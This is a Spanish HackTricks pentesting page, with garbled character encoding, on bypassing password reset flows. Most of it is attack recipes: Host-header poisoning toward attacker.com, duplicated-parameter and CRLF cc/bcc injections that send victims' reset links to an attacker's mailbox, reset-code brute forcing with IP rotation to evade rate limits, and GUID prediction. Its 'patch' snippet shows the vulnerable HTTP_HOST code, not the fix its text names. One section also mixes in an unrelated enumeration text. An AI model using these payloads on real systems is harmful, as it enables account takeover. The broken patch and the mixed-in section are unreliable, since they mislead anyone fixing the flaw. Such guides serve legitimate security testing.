# Bypass de restablecimiento/olvido de contraseÃ±a

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender mÃ¡s sobre errores web3**

ğŸ Lee tutoriales de errores web3

ğŸ”” Recibe notificaciones sobre nuevos programas de recompensas por errores

ğŸ’¬ Participa en discusiones comunitarias

Las siguientes tÃ©cnicas de recompilaciÃ³n se tomaron de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Fuga de token de restablecimiento de contraseÃ±a a travÃ©s del referente

El **referente HTTP** es un campo de encabezado HTTP opcional que identifica la direcciÃ³n de la pÃ¡gina web que estÃ¡ vinculada al recurso que se estÃ¡ solicitando. El encabezado de solicitud Referer contiene la direcciÃ³n de la pÃ¡gina web anterior desde la cual se siguiÃ³ un enlace a la pÃ¡gina solicitada actualmente.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### ExplotaciÃ³n

* Solicita el restablecimiento de la contraseÃ±a a tu direcciÃ³n de correo electrÃ³nico
* Haz clic en el enlace de restablecimiento de contraseÃ±a
* No cambies la contraseÃ±a
* Haz clic en cualquier sitio web de terceros (por ejemplo, Facebook, Twitter)
* Intercepta la solicitud en el proxy de Burpsuite
* Comprueba si el encabezado del referente estÃ¡ filtrando el token de restablecimiento de contraseÃ±a.

### Impacto

Permite a la persona que tiene el control de un sitio en particular cambiar la contraseÃ±a del usuario (ataque CSRF), porque esta persona conoce el token de restablecimiento de contraseÃ±a del usuario.

### Referencia:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Envenenamiento de restablecimiento de contraseÃ±a

Â¡Si encuentras un ataque de encabezado de host y estÃ¡ fuera de alcance, intenta encontrar el botÃ³n de restablecimiento de contraseÃ±a!

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### ExplotaciÃ³n

* Intercepta la solicitud de restablecimiento de contraseÃ±a en Burpsuite
* Agrega el siguiente encabezado o edita el encabezado en Burpsuite (prueba uno por uno)
```
Host: attacker.com
```

```
 Host: target.com
 X-Forwarded-Host: attacker.com
```

```
 Host: target.com
 Host: attacker.com
```
* Verificar si el enlace para cambiar la contraseÃ±a dentro del correo electrÃ³nico apunta a attacker.com

### Parche

Usar `$_SERVER['SERVER_NAME']` en lugar de `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impacto

El usuario vÃ­ctima recibirÃ¡ el enlace malicioso en su correo electrÃ³nico y, al hacer clic en Ã©l, filtrarÃ¡ el enlace / token de restablecimiento de contraseÃ±a del usuario al atacante, lo que llevarÃ¡ a la toma completa de la cuenta.

### Referencia:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## Restablecimiento de contraseÃ±a manipulando el parÃ¡metro de correo electrÃ³nico

### ExplotaciÃ³n

* Agregar el correo electrÃ³nico del atacante como segundo parÃ¡metro usando &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Agregar el correo electrÃ³nico del atacante como segundo parÃ¡metro usando %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Agregar el correo electrÃ³nico del atacante como segundo parÃ¡metro usando |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Agregar el correo electrÃ³nico del atacante como segundo parÃ¡metro usando cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Agregar el correo electrÃ³nico del atacante como segundo parÃ¡metro usando bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Agregar el correo electrÃ³nico del atacante como segundo parÃ¡metro usando ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Agregar el correo electrÃ³nico del atacante como segundo parÃ¡metro en el arreglo json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### Referencia

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Cambiando el correo electrÃ³nico y la contraseÃ±a de cualquier usuario a travÃ©s de parÃ¡metros de API

### ExplotaciÃ³n

* El atacante debe iniciar sesiÃ³n con su cuenta e ir a la funciÃ³n de Cambiar contraseÃ±a
* Inicie Burp Suite e intercepte la solicitud
* DespuÃ©s de interceptar la solicitud, envÃ­ela al repetidor y modifique los parÃ¡metros Correo electrÃ³nico y ContraseÃ±a.
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### Referencia

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Sin lÃ­mite de tasa: bombardeo de correo electrÃ³nico <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### ExplotaciÃ³n

* Inicie Burp Suite e intercepte la solicitud de restablecimiento de contraseÃ±a
* EnvÃ­elo a intruso
* Use carga Ãºtil nula

### Referencia

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## Descubra cÃ³mo se genera el token de restablecimiento de contraseÃ±a

Descubra el patrÃ³n del token de restablecimiento de contraseÃ±a

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Si es

* Generado en funciÃ³n de la marca de tiempo
* Generado en funciÃ³n del ID de usuario
* Generado en funciÃ³n del correo electrÃ³nico del usuario
* Generado en funciÃ³n del nombre y apellido
* Generado en funciÃ³n de la fecha de nacimiento
* Generado en funciÃ³n de la criptografÃ­a

Use Burp Sequencer para encontrar la aleatoriedad o previsibilidad de los tokens.

## GUID adivinable

Existen diferentes tipos de GUID:

* **VersiÃ³n 0:** Solo se ve en el GUID nulo ("00000000-0000-0000-0000-000000000000").
* **VersiÃ³n 1:** El GUID se genera de manera predecible en funciÃ³n de:
  * La hora actual
  * Una "secuencia de reloj" generada aleatoriamente que permanece constante entre GUID durante el tiempo de actividad del sistema generador
  * Un "ID de nodo", que se genera en funciÃ³n de la direcciÃ³n MAC del sistema si estÃ¡ disponible
* **VersiÃ³n 3:** El GUID se genera utilizando un hash MD5 de un nombre y un espacio de nombres proporcionados.
* **VersiÃ³n 4:** El GUID se genera aleatoriamente.
* **VersiÃ³n 5:** El GUID se genera utilizando un hash SHA1 de un nombre y un espacio de nombres proporcionados.

Es posible echar un vistazo a un GUID y descubrir su versiÃ³n, hay una pequeÃ±a herramienta para eso: [**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Si se utiliza la versiÃ³n 1 para generar un GUID de restablecimiento de contraseÃ±a, es posible realizar un ataque de fuerza bruta sobre los GUID.
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### Referencias

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## ManipulaciÃ³n de respuesta: Reemplazar una respuesta mala por una buena

Busque solicitudes y respuestas como estas.
```php
HTTP/1.1 401 Unauthorized
(â€œmessageâ€:â€unsuccessfulâ€,â€statusCode:403,â€errorDescriptionâ€:â€Unsuccessfulâ€)
```
# Cambiar la respuesta

## DescripciÃ³n

A veces, cuando se solicita un restablecimiento de contraseÃ±a, el servidor devuelve una respuesta que puede ser Ãºtil para un atacante. Por ejemplo, puede indicar si el correo electrÃ³nico proporcionado estÃ¡ registrado en el sistema o no. Si el servidor devuelve una respuesta diferente para una direcciÃ³n de correo electrÃ³nico que estÃ¡ registrada en el sistema y otra para una que no lo estÃ¡, un atacante puede usar esto para enumerar direcciones de correo electrÃ³nico vÃ¡lidas.

## Prueba de concepto

Para probar si el servidor devuelve diferentes respuestas para direcciones de correo electrÃ³nico vÃ¡lidas e invÃ¡lidas, puede enviar solicitudes de restablecimiento de contraseÃ±a para direcciones de correo electrÃ³nico que sabe que estÃ¡n registradas en el sistema y para direcciones que no lo estÃ¡n. Luego, compare las respuestas para ver si hay alguna diferencia.

## MitigaciÃ³n

Para evitar que un atacante use este mÃ©todo para enumerar direcciones de correo electrÃ³nico vÃ¡lidas, el servidor debe devolver la misma respuesta para todas las solicitudes de restablecimiento de contraseÃ±a, independientemente de si la direcciÃ³n de correo electrÃ³nico proporcionada estÃ¡ registrada en el sistema o no.
```php
HTTP/1.1 200 OK
(â€œmessageâ€:â€successâ€,â€statusCode:200,â€errorDescriptionâ€:â€Successâ€)
```
### Referencia

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Usando Token Expirado <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* Verificar si el token expirado puede ser reutilizado.

### Fuerza Bruta en Token de Restablecimiento de ContraseÃ±a <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Intentar hacer fuerza bruta en el token de restablecimiento de contraseÃ±a usando Burpsuite.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Usa IP-Rotator en burpsuite para evitar el lÃ­mite de velocidad basado en IP.

### Referencia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Intenta Usar Tu Token <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Intenta agregar tu token de restablecimiento de contraseÃ±a con la cuenta de la vÃ­ctima.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### Referencia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## InvalidaciÃ³n de sesiÃ³n en cierre de sesiÃ³n / restablecimiento de contraseÃ±a

Cuando un usuario cierra sesiÃ³n o restablece su contraseÃ±a, la sesiÃ³n actual debe invalidarse.\
Por lo tanto, **captura las cookies** mientras el usuario estÃ¡ conectado, **cierra sesiÃ³n** y **verifica** si las **cookies** siguen siendo **vÃ¡lidas**.\
Repite el proceso **cambiando la contraseÃ±a** en lugar de cerrar sesiÃ³n.

## Tiempo de expiraciÃ³n del token de restablecimiento

Los **tokens de restablecimiento deben tener un tiempo de expiraciÃ³n**, despuÃ©s del cual el token no deberÃ­a ser vÃ¡lido para cambiar la contraseÃ±a de un usuario.

## Comprobaciones adicionales

* Usa username@burp\_collab.net y analiza la devoluciÃ³n de llamada
* Usuario con copia de correo electrÃ³nico = victim@mail.com%0a%0dcc:hacker@mail.com
* Una contraseÃ±a larga (> 200) conduce a DoS
* Agrega un segundo parÃ¡metro y valor de correo electrÃ³nico

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender mÃ¡s sobre errores web3**

ğŸ Lee tutoriales de errores web3

ğŸ”” Recibe notificaciones sobre nuevos programas de recompensas por errores

ğŸ’¬ Participa en discusiones comunitarias

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
